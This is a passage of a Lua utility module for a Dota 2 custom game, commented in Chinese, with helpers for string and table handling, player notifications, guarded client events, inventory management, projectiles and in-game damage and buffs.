  local result = {}
  local symbolLen = #symbol
  local start = 1
  local found = str:find(symbol, start, true) -- 关闭模式匹配，进行纯文本搜索
  while found do
    table.insert(result, str:sub(start, found - 1))
    start = found + symbolLen
    found = str:find(symbol, start, true)
  end
  table.insert(result, str:sub(start)) -- 添加最后一部分
  return result
end

--设置游戏难度
function Util:SetDif(lv)
  GameRules:SetCustomGameDifficulty(lv)
end

--取游戏难度
function Util:GetDif()
  return GameRules:GetCustomGameDifficulty()
end

--查询游戏是否结束 返回布尔
function Util:IsGameEnd()
  local state = GameRules:State_Get()
  return state == DOTA_GAMERULES_STATE_POST_GAME
end

--遍历打印一个表 不打印类型
function Util:PrintTab2(t)
  local temp = {}
  local function sub_print_r(t, indent)
    if (temp["table"]) then
      print(indent .. "*" .. "table")
    else
      temp["table"] = true
      if (type(t) == "table") then
        for pos, val in pairs(t) do
          if (type(val) == "table") then
            print(indent .. pos .. "=" .. "table" .. " {")
            sub_print_r(val, indent .. string.rep(" ", string.len(pos) + 8))
            print(indent .. string.rep(" ", string.len(pos) + 6) .. "}")
          elseif (type(val) == "string") then
            print(indent .. pos .. '="' .. val .. '"')
          else
            print(indent .. pos .. "=" .. tostring(val))
          end
        end
      else
        print(indent .. "table")
      end
    end
  end
  if (type(t) == "table") then
    print("table" .. " {")
    sub_print_r(t, "  ")
    print("}")
  else
    sub_print_r(t, "  ")
  end
  print()
end

--打印一个表 带类型
function Util:PrintTab(t, indent, done)
  --print ( string.format ('Util:PrintTab type %s', type(keys)) )
  if type(t) ~= "table" then return end

  done = done or {}
  done[t] = true
  indent = indent or 1

  local l = {}
  for k, v in pairs(t) do
    table.insert(l, k)
  end

  table.sort(l)
  if indent == 1 then
    print("{")
  end
  for k, tableKey in ipairs(l) do
    -- Ignore FDesc
    if tableKey ~= 'FDesc' then
      local value = t[tableKey]

      if type(value) == "table" and not done[value] then
        done[value] = true
        print(string.rep("\t", indent) .. tostring(tableKey) .. "  (" .. type(tableKey) .. ")" .. "=")
        Util:PrintTab(value, indent + 1, done)
      elseif type(value) == "userdata" and not done[value] then
        done[value] = true
        print(string.rep("\t", indent) .. tostring(tableKey) .. "= " .. tostring(value))
        Util:PrintTab((getmetatable(value) and getmetatable(value).__index) or getmetatable(value), indent + 1, done)
      else
        if t.FDesc and t.FDesc[tableKey] then
          print(string.rep("\t", indent) .. tostring(t.FDesc[tableKey]))
        else
          --普通kv结果显示：key(type):value(type)
          print(string.rep("\t", indent) ..
            tostring(tableKey) ..
            "  (" .. type(tableKey) .. ")" .. "= " .. tostring(value) .. "  (" .. type(value) .. ")")
        end
      end
    end
  end
  if indent == 1 then
    print("}")
  end
end

--是否是浮点数
function Util:IsFloat(num)
  if type(num) ~= "number" then
    return false
  else
    return math.floor(num) < num
  end
end

--将浮点数修剪为n位小数 有numRes 返回字符串
--不填n 直接砍掉尾巴 4舍5入
--Util:CutFloat(3.12154,2)
function Util:CutFloat(num, n, numRes)
  if not self:IsFloat(num) then
    return numRes and tostring(num) or num
  else
    n = n or 0;
    local fmt = "%." .. n .. "f"
    local value = string.format(fmt, num);
    if not numRes then
      return tonumber(value)
    else --去掉后面的0
      return tostring(tonumber(value));
    end
  end
end

--四舍五入取整
function Util:Float2Int(num)
  if type(num) ~= "number" then
    return num
  end

  if math.floor(num) == math.floor(num + 0.5) then
    return math.floor(num)
  else
    return math.ceil(num)
  end
end

--转值加强版  可转%  纯字符转成0
function Util:tonumber(value)
  local isPercent = false         --是否是百分比数字
  if type(value) == "string" then --字符型的话判断是否有%
    local percentIndex, _ = string.find(value, "%%");
    if percentIndex ~= nil and percentIndex > 1 then
      isPercent = true
      value = tonumber(string.sub(value, 1, percentIndex - 1)) or 0
      value = value / 100 --百分比的求为小数
    else
      value = tonumber(value) or 0
    end
  else
    value = tonumber(value) or 0
  end

  return value, isPercent --是否是百分比
end

--可取非数组表的长度
function Util:GetTableLength(t)
  if t then
    local len = 0;
    for key, var in pairs(t) do
      len = len + 1;
    end
    return len;
  end
  return 0
end

----------- ------------------------------提示消息
--向某玩家发  顶部消息
function Util:TopMsg2ID(ID, msg, color, sec)
  --InforMsg:SendMsg(ID, msg, "normal")
  if not color then color = "white" end
  if not sec then sec = 3 end
  notify:Top(ID, {
    text = msg,
    duration = sec,
    style = { color = color, ["font-size"] = "35px" },
    continue = false
  })
end

--向所有玩家发  顶部消息
function Util:TopMsg2All(msg, color, sec, bg_color)
  if not color then color = "white" end
  if not sec then sec = 3 end
  if color == "red" then
    color = "#cc3300"
  end
  local style = { color = color, ["font-size"] = "50px" }
  if bg_color and bg_color ~= "" then
    style["background-color"] = bg_color
    style["padding"] = "10px 20px"
    style["border-radius"] = "10px"
  end
  notify:TopToAll({
    text = msg,
    duration = sec,
    style = style,
    continue = false
  })
end

--向指定ID发 底部消息
-- bg_color：可选，如 "#000000cc"、"rgba(0,0,0,0.75)"，给文字区域加背景（走 Panorama Label 的 background-color）
function Util:BottomMsg2ID(ID, msg, color, sec)
  --InforMsg:SendMsg(ID, msg, "normal")
  if ID == nil or not PlayerResource then
    return
  end
  if self:IsPseudoPlayerID(ID) then
    return
  end
  if not PlayerResource:IsValidPlayer(ID) then
    return
  end
  local player = PlayerResource:GetPlayer(ID)
  if not player then
    return
  end
  if not color then color = "white" end
  if not sec then sec = 3 end
  if color == "red" then
    color = "#cc3300"
  end
  local style = { color = color, ["font-size"] = "50px" }
  local bg_color = "#000000cc"
  if bg_color and bg_color ~= "" then
    style["background-color"] = bg_color
    style["padding"] = "10px 20px"
    style["border-radius"] = "10px"
  end
  notify:Bottom(player,
    {
      text = msg,
      duration = sec,
      style = style,
      continue = false
    })
end

--向所有玩家发  底部消息
function Util:BottomMsg2All(msg, color, sec)
  if not color then color = "yellow" end
  if not sec then sec = 3 end
  notify:BottomToTeam(DOTA_TEAM_GOODGUYS,
    {
      text = msg,
      duration = sec,
      class = "NotificationMessage",
      style = { color = color, ["font-size"] = "50px" },
      continue = false
    })
end

--清除所有
function Util:ClearAllMsg(sec)
  if not sec then sec = 0 end
  Timers:CreateTimer(sec, function()
    notify:ClearBottomFromAll()
    notify:ClearTopFromAll()
  end)
end

-----------------------------------------------
--- 已进入 DISCONNECT 或 GameRules 不可用时勿发 CustomGameEvent，避免与 NETWORK_DISCONNECT_SHUTDOWN 竞态导致客户端原生崩溃
function Util:ClrbSafeToSendCustomGameEvents()
  if not GameRules then
    return false
  end
  local ok, st = pcall(function()
    return GameRules:State_Get()
  end)
  if not ok or st == nil then
    return false
  end
  if st == DOTA_GAMERULES_STATE_DISCONNECT then
    return false
  end
  return true
end

--- 除 except_id 外是否仍有 CONNECTED 的真人客户端（伪玩家槽不计）
function Util:ClrbHasOtherConnectedHumansExcept(except_id)
  if not PlayerResource then
    return false
  end
  local conn = DOTA_CONNECTION_STATE_CONNECTED
  for pid = 0, DOTA_MAX_PLAYERS do
    if (except_id == nil or pid ~= except_id) and PlayerResource:IsValidPlayer(pid) then
      if PlayerResource:GetConnectionState(pid) == conn then
        if not self:IsPseudoPlayerID(pid) then
          return true
        end
      end
    end
  end
  return false
end

--发送事件到JS
function Util:Send2Js(name, tab)
  if not CustomGameEventManager or name == nil or tab == nil then
    return
  end
  if not self:ClrbSafeToSendCustomGameEvents() then
    return
  end
  local ok, err = pcall(function()
    CustomGameEventManager:Send_ServerToAllClients(name, tab)
  end)
  if not ok then
    -- print("[Send2Js] " .. tostring(name) .. " " .. tostring(err))
    if Server and Server.SendError then
      Server:SendError(tostring(err), "Send2Js:" .. tostring(name))
    end
  end
end

function Util:Send2JsID(name, tab, ID)
  if not CustomGameEventManager or not PlayerResource or name == nil or tab == nil or ID == nil then
    return
  end
  if not self:ClrbSafeToSendCustomGameEvents() then
    return
  end
  if self:IsPseudoPlayerID(ID) then
    return
  end
  if not PlayerResource:IsValidPlayer(ID) then
    return
  end
  if PlayerResource:GetConnectionState(ID) ~= DOTA_CONNECTION_STATE_CONNECTED then
    return
  end
  local p = PlayerResource:GetPlayer(ID)
  if not p or p:IsNull() then
    return
  end
  local ok, err = pcall(function()
    CustomGameEventManager:Send_ServerToPlayer(p, name, tab)
  end)
  if not ok then
    -- print("[Send2JsID] " .. tostring(name) .. " pid=" .. tostring(ID) .. " " .. tostring(err))
    if Server and Server.SendError then
      Server:SendError(tostring(err), "Send2JsID:" .. tostring(name))
    end
  end
end

--- InitPlayer 中存在 bot 标记的伪玩家（用于与人机局广播策略）
function Util:ClrbHasPseudoBotPlayers()
  if not PD or not PD.IDs or not InitPlayer or not InitPlayer.GetPlayerData then
    return false
  end
  for _, pid in pairs(PD.IDs) do
    local pd = InitPlayer:GetPlayerData(pid)
    if pd and pd.bot then
      return true
    end
  end
  return false
end

--- 仅人机局（含伪玩家槽）逐 CONNECTED 客户端发送，避免假人/断线槽与 `Send_ServerToAllClients` 竞态。
--- 纯真人游廊/本地仍用全体广播一次，避免 N 路重复序列化导致卡顿（见 Send2JsBotsSafe）。
function Util:ClrbUseSafeJsBroadcast()
  return self:ClrbHasPseudoBotPlayers()
end

--- 仅向 CONNECTED 的真人引擎槽发事件；except_id 有值时跳过该槽（断线者）。伪玩家无客户端。
function Util:Send2JsToConnectedHumansExcept(name, tab, except_id)
  if not CustomGameEventManager or not PlayerResource or name == nil or tab == nil then
    return
  end
  if not self:ClrbSafeToSendCustomGameEvents() then
    return
  end
  local conn = DOTA_CONNECTION_STATE_CONNECTED
  for pid = 0, DOTA_MAX_PLAYERS do
    if (except_id == nil or pid ~= except_id) and PlayerResource:IsValidPlayer(pid) then
      if PlayerResource:GetConnectionState(pid) == conn then
        if not self:IsPseudoPlayerID(pid) then
          local p = PlayerResource:GetPlayer(pid)
          if p and not p:IsNull() then
            local ok, err = pcall(function()
              CustomGameEventManager:Send_ServerToPlayer(p, name, tab)
            end)
            if not ok then
              -- print("[Send2JsToConnectedHumansExcept] " .. tostring(name) .. " pid=" .. tostring(pid) .. " " .. tostring(err))
              if Server and Server.SendError then
                Server:SendError(tostring(err), "Send2JsToConnectedHumansExcept:" .. tostring(name))
              end
            end
          end
        end
      end
    end
  end
end

--- 人机局改为逐客户端发送；否则与旧版一致全体广播（Stat 热路径仍可直接用 Send2Js）
function Util:Send2JsBotsSafe(name, tab, except_id)
  if self:ClrbUseSafeJsBroadcast() then
    self:Send2JsToConnectedHumansExcept(name, tab, except_id)
  else
    self:Send2Js(name, tab)
  end
end

--------------------------------------------------------
--取反any并分割成tab
--aaa_bbb_ddd_ccc
--[[
可输入一个或多个进行替换
.(点): 与任何字符配对
%a: 与任何字母配对
%c: 与任何控制符配对(例如\n)
%d: 与任何数字配对
%l: 与任何小写字母配对
%p: 与任何标点(punctuation)配对
%s: 与空白字符配对
%u: 与任何大写字母配对
%w: 与任何字母/数字配对
%x: 与任何十六进制数配对
%z: 与任何代表0的字符配对
% + (^$()%.[]*+-?)
[^%s]+ 取反space 并尽可能长
使用时放在"()"中
]]
--从每个any处拆分数组 any删除
--any为 %类 或者 具体字符
--这个有问题
function Util:Split2(str, any)
  if not any then any = "%p" end
  local k = 1
  local tab = {}
  for str in string.gmatch(str, "([^" .. any .. "]+)") do
    tab[k] = str
    k = k + 1
  end
  return tab
end

--删除所有空格 汉字 标点 或者乱七八糟
--不写any 就只留 字母+数字
function Util:ClearStr(str, any)
  if any == nil then any = "([^%w])" end
  str = string.gsub(str, any, "")
  return str
end

--检查开头1-n个字符是不是head
--返回开始、结束位置 用于判断
--只返回首位置判断貌似也没问题
function Util:CheckStrHead(str, head)
  local len = string.len(head)
  local start, last = string.find(str, head)
  if start == 1 and last == len then
    return true
  end
end

--用b替换a 删除a 找到的都替换
function Util:ReplaceStr(str, a, b)
  str = string.gsub(str, a, b)
  return str
end

--检测字符里某个字符出现的次数
--返回截取这个字符的数组

function Util:CheckStrNum(str, any)
  local k = 1
  local tab = {}
  for str in string.gmatch(str, "([" .. any .. "]+)") do
    tab[k] = str
    k = k + 1
  end
  return tab
end

--替换字符中出现的第n个字符
--连续出现的，会被视为1个,写多了会报错
--可以处理如下
--[[
   "item_item_item_item"
]]
function Util:ReplaceStrAtPos(str, a, n, b)
  if n == nil then n = 1 end
  local tab = self:Split(str, a)
  local tab2 = self:CheckStrNum(str, a)
  tab2[n] = b

  if #tab > #tab2 then
    tab2[#tab] = ""
  elseif #tab < #tab2 then
    tab[#tab2] = ""
  end

  local str2 = ""
  for i = 1, #tab do
    if self:CheckStrHead(str, a) then
      str2 = str2 .. tab2[i] .. tab[i]
    else
      str2 = str2 .. tab[i] .. tab2[i]
    end
  end
  return str2
end

--截取某个n到nn的片段
function Util:CutOut(str, n, nn)
  str = string.sub(str, n, nn)
  return str
end

--删除后n位
function Util:CutOutEnd(str, n)
  str = string.sub(str, 1, -n - 1)
  return str
end

---------------------------------------------tab工具
--检查表里元素个数 表内表不进去数
function Util:TabCount(tab)
  local count = 0
  for _ in pairs(tab) do
    count = count + 1
  end
  return count
end

--检查表里是否有某元素 表查不到
function Util:TabContains(tab, va)
  for _, v in pairs(tab) do
    if v == va then
      return true
    end
  end
end

--检查表里是否有某键
function Util:TabFindKey(tab, key)
  for k, _ in pairs(tab) do
    if k == key then
      return true
    end
  end
end

--表里随机取值
function Util:TabRandom(tab)
  local keys = {}
  for k, _ in pairs(tab) do
    table.insert(keys, k)
  end
  local key = keys[RandomInt(1, #keys)]
  return tab[key]
end

--取所有键
function Util:TabAllKeys(tab)
  local keystab = {}
  for k, _ in pairs(tab) do
    table.insert(keystab, k)
  end
  return keystab
end

--简单打印表
function Util:Print(tab)
  for k, v in pairs(tab) do
    print(k, v)
  end
end

-- 只保留所有的字符串和数字，并且把所有的数字都转换成字符串
-- 避免在nettable传输过程中产生的bug
function Util:SafeTab(tab)
  local r = {}
  for k, v in pairs(tab) do
    if type(v) == "table" and k ~= "_M" then -- 避免module的死循环
      r[k] = self:SafeTab(v)
    elseif type(v) == "string" or type(v) == "number" then
      r[k] = tostring(v)
    end
  end

  return r
end

---将一个表保存为KV文件
---@param tbl table 要输出的表
---@param filePath string 输出的文件路径
---@param headerName string 标题头，默认为unknown_header
function Util:SaveAsKv(tbl, filePath, headerName, utf16)
  local file = io.open(filePath, "w")
  if utf16 then
    file:write(utf8_to_utf16le("\"" .. (headerName or "unknown_header") .. "\"\n"))
    file:write(utf8_to_utf16le('{\n'))
    for _, line in pairs(Util:ToKvLines(tbl, 1)) do
      file:write(utf8_to_utf16le(line .. "\n"))
    end
    file:write(utf8_to_utf16le('}\n'))
  else
    file:write("\"" .. (headerName or "unknown_header") .. "\"\n")
    file:write('{\n')
    for _, line in pairs(Util:ToKvLines(tbl, 1)) do
      file:write(line .. "\n")
    end
    file:write('}\n')
  end

  file:flush()
  file:close()
end

function Util:ToKvLines(tbl, tabCount)
  tabCount = tabCount or 0
  local result = {}
  local preTabs = ""
  for i = 1, tabCount do
    preTabs = preTabs .. "\t"
  end
  for k, v in pairs(tbl) do
    if type(v) == "table" then
      table.insert(result, preTabs .. "\"" .. tostring(k) .. "\"")
      table.insert(result, preTabs .. "{")
      local lines = Util:ToKvLines(v, tabCount + 1)
      for _, line in pairs(lines) do
        table.insert(result, preTabs .. line)
      end
      table.insert(result, preTabs .. "}")
    else
      table.insert(result, string.format("%s\"%s\"\t\t\"%s\"", preTabs, k, v))
    end
  end
  return result
end

function Util:TabJoin(...)
  local arg = { ... }
  local r = {}
  for _, t in pairs(arg) do
    if type(t) == "table" then
      for _, v in pairs(t) do
        table.insert(r, v)
      end
    else
      -- 如果是数值，直接插入到表
      table.insert(r, t)
    end
  end

  return r
end

-- 获取一个表的反向表
function Util:TabReverse(tbl)
  local t = {}
  for k, v in pairs(tbl) do
    t[v] = k
  end
  return t
end

--深拷贝
function Util:DeepCopyTab(orig)
  local copy
  -- print(456)
  if type(orig) == "table" then
    copy = {}
    for orig_key, orig_value in next, orig, nil do
      copy[Util:DeepCopyTab(orig_key)] = Util:DeepCopyTab(orig_value)
    end
    setmetatable(copy, Util:DeepCopyTab(getmetatable(orig)))
  else
    copy = orig
  end
  return copy
end

--浅拷贝
function Util:CopyTab(orig)
  local copy
  if type(orig) == 'table' then
    copy = {}
    for orig_key, orig_value in pairs(orig) do
      copy[orig_key] = orig_value
    end
  else -- number, string, boolean, etc
    copy = orig
  end
  return copy
end

--英雄身上是否有某物
function Util:HasItem(hero, item)
  if not hero or hero:IsNull() or not hero:IsRealHero() then return end
  if hero:IsIllusion() then return end
  if not item or not IsValidEntity(item) then return end
  local slot = item:GetItemSlot()
  if not slot or slot == -1 then return end
  local check = false
  local Fname = item:GetName()
  local Findex = item:entindex()
  for i = 0, 8 do
    local slotitem = hero:GetItemInSlot(i)
    if slotitem and not slotitem:IsNull() then
      local name = slotitem:GetName()
      local index = slotitem:entindex()
      if name == Fname and index == Findex then
        check = true
        break
      end
    end
  end
  if check then return true end
end

--玩家身上是否满了
function Util:IsInventoryFull(ID, hero)
  local num = hero:GetNumItemsInInventory()
  if num < 9 then
    return false
  else
    return true
  end
end

--给玩家添加一个非充能物品 至身上或背包
function Util:AddItem2Hero(hero, itemname)
  if not hero or not itemname then return end
  if hero:IsNull() then return end
  local ID = self:Hero2ID(hero)
  if not ID then return end
  local item = CreateItem(itemname, hero, hero)
  if not item or item:IsNull() then return end
  item.limitplayer = ID
  --自动使用的物品不放入个人背包 直接add
  if item:IsCastOnPickup() and self:IsInventoryFull(ID, hero) then
    hero:AddItem(item)
    hero:EmitSound("UI.Putinbag")
    return true
  end

  --其它情况
  if not self:IsInventoryFull(ID, hero) then
    hero:AddItem(item)
    hero:EmitSound("UI.Putinbag")
    return true
  else
    local slot = Bag:GetNotUseSlot(hero)
    if slot then
      local Per = Bag:GetPer(hero)
      local index = item:GetEntityIndex()
      Per[slot] = index
      Bag:PerToNet(hero)
      hero:EmitSound("UI.Putinbag")
      return true
    end
  end
end

--玩家扔掉装不下的物品
function Util:DropItem(hero, itemname)
  local item = CreateItem(itemname, hero, hero)
  if hero and not hero:IsNull() then
    local ID = Util:Hero2ID(hero)
    if ID then
      item.limitplayer = ID
    end
  end
  local pos = hero:GetOrigin()
  local Ranx = RandomInt(-150, 150) + pos.x
  local Rany = RandomInt(-150, 150) + pos.y
  local RanPos = Vector(Ranx, Rany, 0)
  Bag:DropItemInPos(RanPos, item)
  --hero:AddItem(item)
  --hero:DropItemAtPositionImmediate(item,hero:GetOrigin())
  hero:EmitSound("UI.Putinbag")
end

--百分比英雄减少血
function Util:HeroTakeDamage(hero, num)
  EmitSoundOn("DOTA_Item.MedallionOfCourage.Activate", hero)
  local FXIndex = ParticleManager:CreateParticle(
    "particles/econ/items/lifestealer/ls_ti9_immortal/ls_ti9_open_wounds_blood_soft.vpcf", PATTACH_CENTER_FOLLOW, hero)
  ParticleManager:ReleaseParticleIndex(FXIndex)
  hero:SetHealth(hero:GetHealth() * num)
end

--最大生命百分比治疗英雄
function Util:HealHero(hero, num)
  hero:EmitSoundParams("DOTA_Item.Mango.Activate", 0, 0.5, 0)
  hero:Heal(hero:GetMaxHealth() * num, self)
  local pa = ParticleManager:CreateParticle("particles/items3_fx/fish_bones_active.vpcf", PATTACH_ABSORIGIN_FOLLOW, hero)
  ParticleManager:ReleaseParticleIndex(pa)
end

--玩家身上是否有某物 返回实体
function Util:FindItemByNameInInv(hero, name)
  for i = 0, 8 do
    local item = hero:GetItemInSlot(i)
    if item and not item:IsNull() then
      local check = item:GetName()
      if name == check then
        return item
      end
    end
  end
end

--玩家背包是否有某物 返回实体
function Util:FindItemByNameInPer(hero, name)
  local ID = Util:Hero2ID(hero)
  if not ID then return end
  local Per = Bag:GetPer(hero)
  if not Per then return end
  for i = 1, BagSet.MaxPerSlot do
    local index = Per[i]
    if index and index ~= -1 then
      local item = Util:Index2Entity(index)
      if item and not item:IsNull() then
        local check = item:GetName()
        if check == name then
          return item
        end
      end
    end
  end
end

--移除一个物品 同时检查是否为背包物品一并移除
function Util:RemvoeItem(hero, item)
  local index = item:entindex()
  local con = item:GetContainer()
  item:RemoveSelf()
  if con and not con:IsNull() then
    con:RemoveSelf()
  end

  local slot = Bag:CheckItemInPer(hero, index)

  if slot then
    Bag:RemovePerItem(hero, slot)
  end
  return true
end

--给英雄添加一个物品到身上，背包 若满 扔在周围
function Util:AddOrDrop(hero, name)
  if not self:AddItem2Hero(hero, name) then
    local item = CreateItem(name, hero, hero)
    local pos = hero:GetOrigin()
    local Ranx = RandomInt(-150, 150) + pos.x
    local Rany = RandomInt(-150, 150) + pos.y
    local RanPos = Vector(Ranx, Rany, 0)
    Bag:DropItemInPos(RanPos, item, hero)
  end
end

------------------------------------技能向 技能施法外的不保证
--为了方便将基础信息都挂载到技能实体上

--坐标a到坐标b的方向
function Util:GetDir(a, b)
  if not a or not b then return end
  return (b - a):Normalized()
end

--取a至b两个点的方向 并Y偏移角度
function Util:GetDirByAngle(a, b, y)
  local newb = RotatePosition(a, QAngle(0, y, 0), b)
  return self:GetDir(a, newb)
end

--通过技能ab施法 发射一个扇形投射物 需要点目标技能
function Util:CreateArcPro(eff, ab)
  local cur = ab:GetCursorPosition()
  if not cur then return end
  local ca = ab:GetCaster()
  local pos = ca:GetAbsOrigin()
  local ang = 70
  for i = 1, 14 do
    local dir = Util:GetDirByAngle(pos, cur, ang)
    local pp =
    {
      EffectName = eff,
      Ability = ab,
      vSpawnOrigin = pos,
      vVelocity = dir * 1300,
      fDistance = 800,
      fStartRadius = 40,
      fEndRadius = 40,
      Source = ca,
      bHasFrontalCone = false,
      bReplaceExisting = false,
      iUnitTargetTeam = DOTA_UNIT_TARGET_TEAM_ENEMY,
      iUnitTargetFlags = DOTA_UNIT_TARGET_FLAG_NONE,
      iUnitTargetType = DOTA_UNIT_TARGET_HERO + DOTA_UNIT_TARGET_BASIC,
      bProvidesVision = true,
      iVisionRadius = 300,
      iVisionTeamNumber = ca:GetTeamNumber()
    }
    ProjectileManager:CreateLinearProjectile(pp)
    ang = ang - 10
  end
end

--通过技能ab施法 横向宽范围出箭 需要点目标技能
function Util:CreateWidPro(eff, ab, n)
  local dir = self:GetDir(ab.cave, ab.cur)
  if not dir then return end
  for i = 1, n do
    local Int = RandomInt(10, 600)
    local ve = RandomVector(Int) + ab.cave
    local pp =
    {
      EffectName = eff,
      Ability = ab,
      vSpawnOrigin = ve,
      vVelocity = dir * 1300,
      fDistance = 800,
      fStartRadius = 40,
      fEndRadius = 40,
      Source = ab.ca,
      bHasFrontalCone = false,
      bReplaceExisting = false,
      iUnitTargetTeam = DOTA_UNIT_TARGET_TEAM_ENEMY,
      iUnitTargetFlags = DOTA_UNIT_TARGET_FLAG_NONE,
      iUnitTargetType = DOTA_UNIT_TARGET_HERO + DOTA_UNIT_TARGET_BASIC,
      bProvidesVision = true,
      iVisionRadius = 300,
      iVisionTeamNumber = ab.team
    }
    ProjectileManager:CreateLinearProjectile(pp)
  end
end

--通过技能ab施法 创建单个投射物
function Util:CreatePro(eff, ab)
  local cur = ab:GetCursorPosition()
  if not cur then return end
  local ca = ab:GetCaster()
  local pos = ca:GetAbsOrigin()
  local dir = Util:GetDir(pos, cur)
  local pp =
  {
    EffectName = eff,
    Ability = ab,
    vSpawnOrigin = pos,
    vVelocity = dir * 1300,
    fDistance = 800,
    fStartRadius = 40,
    fEndRadius = 40,
    Source = ca,
    bHasFrontalCone = false,
    bReplaceExisting = false,
    iUnitTargetTeam = DOTA_UNIT_TARGET_TEAM_ENEMY,
    iUnitTargetFlags = DOTA_UNIT_TARGET_FLAG_NONE,
    iUnitTargetType = DOTA_UNIT_TARGET_HERO + DOTA_UNIT_TARGET_BASIC,
    bProvidesVision = true,
    iVisionRadius = 300,
    iVisionTeamNumber = ca:GetTeamNumber()
  }
  ProjectileManager:CreateLinearProjectile(pp)
end

--应用伤害
function Util:DamageUnit(ca, ta, damage)
  local tab = {
    attacker = ca,
    victim = ta,
    damage = damage,
    damage_type = DAMAGE_TYPE_PHYSICAL,
  }
  ApplyDamage(tab)
end

--创建追踪抽射 可以携带一个值 键为key  也可以带一个表
function Util:CreateTrack(ab, name, ta, value)
  if not ta then
    ta = ab.ta
  end
  if not ta then return end
  local P = {
    Ability = ab,
    Source = ab.ca,
    vSourceLoc = ab.cave,
    Target = ta,
    EffectName = name,
    iMoveSpeed = 2000,
    bDrawsOnMinimap = false,
    bDodgeable = false,
    bIsAttack = false,
    bProvidesVision = false,
    bReplaceExisting = false,
    bVisibleToEnemies = true,
    iSourceAttachment = DOTA_PROJECTILE_ATTACHMENT_ATTACK_2,
    ExtraData = tab
  }
  if value and type(value) ~= "table" then
    P.ExtraData = {}
    P.ExtraData.key = value
  elseif value and type(value) == "table" then
    P.ExtraData.key = value
  end

  ProjectileManager:CreateTrackingProjectile(P)
end

--创建一个友军
function Util:AddGood(hero, name)
  if not hero or not name then return end
  local ve = hero:GetAbsOrigin() + hero:GetForwardVector() * 200
  local team = DOTA_TEAM_GOODGUYS
  local unit = CreateUnitByName(name, ve, true, nil, nil, team)
  return unit
end

--创建一个敌方单位
function Util:AddBad(hero, name)
  if not hero or not name then return end
  local ve = hero:GetAbsOrigin() + hero:GetForwardVector() * 200
  local team = DOTA_TEAM_BADGUYS
  local unit = CreateUnitByName(name, ve, true, nil, nil, team)
  return unit
end

--ab两点之间的敌人
function Util:Line2Enemy(ca, a, b, width)
  if not ca or type(ca) ~= "table" then return end
  if width == nil then width = 50 end
  local enemy = FindUnitsInLine(
    ca:GetTeam(),
    a,
    b,
    ca,
    width,
    DOTA_UNIT_TARGET_TEAM_ENEMY,
    DOTA_UNIT_TARGET_BASIC + DOTA_UNIT_TARGET_HERO,
    DOTA_UNIT_TARGET_FLAG_NONE)
  return enemy
end

--技能开始的基础值 OnSpellStart时挂载基础信息到实体 IsServer？
--挂鼠标坐标、鼠标目标、施法者、施法者队伍、施法者坐标
function Util:AbBase(ab)
  ab.cur = ab:GetCursorPosition()
  ab.ta = ab:GetCursorTarget()
  ab.ca = ab:GetCaster()

  if ab.ca then
    ab.team = ab.ca:GetTeamNumber()
    ab.cave = ab.ca:GetAbsOrigin()
  end

  if ab.ta then
    ab.tave = ab.ta:GetAbsOrigin()
    ab.tateam = ab.ta:GetTeamNumber()
  end
end

--buff基础 OnCreated时挂载基础信息到实体 IsServer？
--挂父、技能、父坐标
function Util:BfBase(bf)
  bf.pa = bf:GetParent()
  bf.ab = bf:GetAbility()
  if bf.pa and IsValidEntity(bf.pa) then
    bf.pave = bf.pa:GetAbsOrigin()
  end
  if bf.ab then
    bf.ca = bf.ab.ca
    bf.cave = bf.ab.cave
    bf.ta = bf.ab.ta
    bf.tave = bf.ab.tave
    bf.tateam = bf.ab.tateam
    bf.cur = bf.ab.cur
  end
end

--攻击/命中基础 ON_ATTACK攻击一开始
--Util:AtBase(self,keys)
--Util:BitYou(self,keys)
function Util:AtBase(bf, keys)
  local at = keys.attacker
  local ta = keys.target
  local atve = nil
  local tave = nil
  if at and IsValidEntity(at) then
    atve = at:GetAbsOrigin()
  end
  if ta and IsValidEntity(ta) then
    tave = ta:GetAbsOrigin()
  end
  bf.at = at
  bf.ta = ta
  bf.atve = atve
  bf.tave = tave
end

--ontakedamage 事件 是不是我在打人
function Util:BitYou(bf, keys)
  local at = keys.attacker
  if bf.pa == at then
    return true
  end
end

--是不是在挨打
function Util:BitMe(bf, keys)
  local un = keys.unit
  if bf.pa == un then
    return true
  end
end

--ab两线之间的单位造成伤害
function Util:Line2Damage(ca, a, b, width, damage)
  local em = self:Line2Enemy(ca, a, b, width)
  if em and #em > 0 then
    for k, v in pairs(em) do
      local tab = {
        attacker = ca,
        victim = v,
        damage = damage,
        damage_type = DAMAGE_TYPE_PHYSICAL,
      }
      ApplyDamage(tab)
    end
  end
end

--半径转伤害 通过一个目标查询 只会查BADGUYS
function Util:Radius2Damage(ca, radius, damage)
  if ca == nil or not IsValidEntity(ca) then return end
  if radius == nil then radius = RandomInt(300, 400) end
  local team = ca:GetTeamNumber()
  local Dw = DOTA_UNIT_TARGET_TEAM_ENEMY
  if team == DOTA_TEAM_BADGUYS then
    Dw = DOTA_UNIT_TARGET_TEAM_FRIENDLY
  end
  local em = FindUnitsInRadius(
    team,
    ca:GetAbsOrigin(),
    nil,
    radius,
    Dw,
    DOTA_UNIT_TARGET_HERO + DOTA_UNIT_TARGET_BASIC,
    DOTA_UNIT_TARGET_FLAG_MAGIC_IMMUNE_ENEMIES,
    FIND_CLOSEST,
    false)
  if em and #em > 0 then
    for k, v in pairs(em) do
      local tab = {
        attacker = ca,
        victim = v,
        damage = damage,
        damage_type = DAMAGE_TYPE_PHYSICAL,
      }
      ApplyDamage(tab)
    end
  end
end

--半径转加buff 通过一个目标查询 默认查BADGUYS
--加个“good” 查友军 不含自己
function Util:Radius2AddBuff(ca, radius, ab, buffname, dur, ve, duiwu)
  if ca == nil or not IsValidEntity(ca) then return end
  if radius == nil then radius = RandomInt(300, 400) end
  local team = ca:GetTeamNumber()
  local Dw = DOTA_UNIT_TARGET_TEAM_ENEMY
  if duiwu and duiwu == "good" then
    Dw = DOTA_UNIT_TARGET_TEAM_FRIENDLY
  elseif duiwu and duiwu == "bad" then
    Dw = DOTA_UNIT_TARGET_TEAM_ENEMY
  end
  local vect = ca:GetAbsOrigin()
  if ve then
    vect = ve
  end
  local em = FindUnitsInRadius(
    team,
    vect,
    nil,
    radius,
    Dw,
    DOTA_UNIT_TARGET_HERO + DOTA_UNIT_TARGET_BASIC,
    DOTA_UNIT_TARGET_FLAG_MAGIC_IMMUNE_ENEMIES,
    FIND_CLOSEST,
    false)
  if em and #em > 0 then
    for k, v in pairs(em) do
      if not v:IsMagicImmune() then
        if v ~= ca then
          self:AddBuff(v, ab, buffname, dur)
        end
      end
    end
  end
end

--加眩晕buff
function Util:AddStun(ta, dur)
